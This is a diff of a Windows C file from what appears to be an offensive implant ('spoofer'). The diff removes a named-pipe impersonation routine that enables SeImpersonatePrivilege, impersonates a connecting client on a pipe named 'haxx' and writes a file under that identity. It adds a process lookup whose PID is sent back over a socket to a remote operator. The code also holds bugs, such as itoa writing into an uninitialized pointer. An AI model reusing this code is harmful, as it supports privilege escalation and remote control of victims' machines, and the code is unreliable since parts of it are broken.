@@ -5,6 +5,17 @@
 */
 
 #include "spoofer.h"
+#include "doexec.h"
+#include <sddl.h>
+#include <userenv.h>
+#include <stdlib.h>
+#include <Lmcons.h>
+#include <windows.h>
+#include <stdio.h>
+#include <string.h>
+#include <tlhelp32.h>
+
+#define ERROR_NOT_ALL_ASSIGNED 1300L
 
 int username(int sockfd){
 
@@ -19,108 +30,44 @@ int username(int sockfd){
     return 0;
 }
 
+// find process ID by process name
+int findMyProc(const char *procname, int sockfd) {
 
-int EnableWindowsPrivilege(LPCWSTR Privilege){
-	/* Tries to enable privilege if it is present to the Permissions set.
-  https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html */
-	LUID luid = {};
-	TOKEN_PRIVILEGES tp;
-	HANDLE currentProcess = GetCurrentProcess();
-	HANDLE currentToken;
-	tp.PrivilegeCount = 1;
-	tp.Privileges[0].Luid = luid;
-	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-	if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;
-	if (!OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &currentToken)) return FALSE;
-	if (!AdjustTokenPrivileges(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) return FALSE;
-	
-    return 0;
-}
+  HANDLE hSnapshot;
+  PROCESSENTRY32 pe;
+  int pid = 0;
+  BOOL hResult;
 
-int main(int argc, WCHAR *argv){
-    HANDLE hPipe, hToken, userToken;
-    char buffer[1024];
-	DWORD dwRead;
-	SECURITY_DESCRIPTOR sd;
-	InitializeSecurityDescriptor(&sd, 1);
-	SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
-	SECURITY_ATTRIBUTES sa;
-	sa.lpSecurityDescriptor = &sd;
+  // snapshot of all processes in the system
+  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
 
+  // initializing size: needed for using Process32First
+  pe.dwSize = sizeof(PROCESSENTRY32);
 
-	if (EnableWindowsPrivilege(SE_IMPERSONATE_NAME)) {
-		printf("Enabled SeImpersonatePrivilege\n");
-	}
-	else{
-        printf("Failed to enable SeImpersonatePrivilege\n");
+  // info about first process encountered in a system snapshot
+  hResult = Process32First(hSnapshot, &pe);
+
+  // retrieve information about the processes
+  // and exit if unsuccessful
+  while (hResult) {
+    // if we find the process: return process ID
+    if (strcmp(procname, pe.szExeFile) == 0) {
+      pid = pe.th32ProcessID;
+      break;
     }
+    hResult = Process32Next(hSnapshot, &pe);
+  }
 
-    printf("Starting server\n");
+  // closes an open handle (CreateToolhelp32Snapshot)
+  CloseHandle(hSnapshot);
 
-    hPipe = CreateNamedPipe(L"\\\\.\\pipe\\haxx", PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, 2, 0, 0, 0, &sa);
-    if (ConnectNamedPipe(hPipe, NULL) != FALSE)   // wait for someone to connect to the pipe
-			printf("Connected to client\n");
-
-		if (!ReadFile(hPipe, &buffer, 1, &dwRead, NULL)) {
-			printf("Read failed\n");
-			exit(1);
-		}
-
-		printf("Impersonating...\n");
-
-		if (ImpersonateNamedPipeClient(hPipe) != TRUE) {
-			printf("Failed to impersonate client\n");
-			exit(1);
-		}else {
-			HANDLE hFile; 
-			DWORD dwBytesWritten = 0;
-			BOOL bErrorFlag = FALSE;
-			DWORD dwBytesToWrite = (DWORD)strlen(Data);
-			printf("Successfully impersonated client, writing file now...%s\n", fileName );
-
-			hFile = CreateFile(fileName,                
-				       GENERIC_WRITE,          
-				       0,                      
-				       NULL,                   
-				       CREATE_NEW,             
-				       FILE_ATTRIBUTE_NORMAL,  
-				       NULL);                  
-
-			if (hFile == INVALID_HANDLE_VALUE) 
-			{ 
-			    printf("Unable to open file for write.\n");
-			    return 1;
-			}
-
-			printf("Writing %d bytes to %s \n", dwBytesToWrite, fileName);
-
-			bErrorFlag = WriteFile( 
-				    hFile,           
-				    Data,      
-				    dwBytesToWrite,  
-				    &dwBytesWritten,  
-				    NULL);           
-
-			if (FALSE == bErrorFlag)
-			{
-			    printf("Unable to write to file.\n");
-			}
-			else
-			{
-			    if (dwBytesWritten != dwBytesToWrite)
-			    {
-				printf("Error: incomplete write\n");
-			    }
-			    else
-			    {
-			       printf("Written successfully.\n");
-			    }
-			}
-
-		}
-
-	DisconnectNamedPipe(hPipe);
-
-	return 0;    
-
+  char *print_this = "\r\n\r\n[+] The Process ID Is: ";
+  send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
+  
+  char *spid;
+  // Convert 123 to string [buf]
+  itoa(pid, spid, 10);
+  send(sockfd, spid, sizeof(int), 0);  
+  return pid;
 }
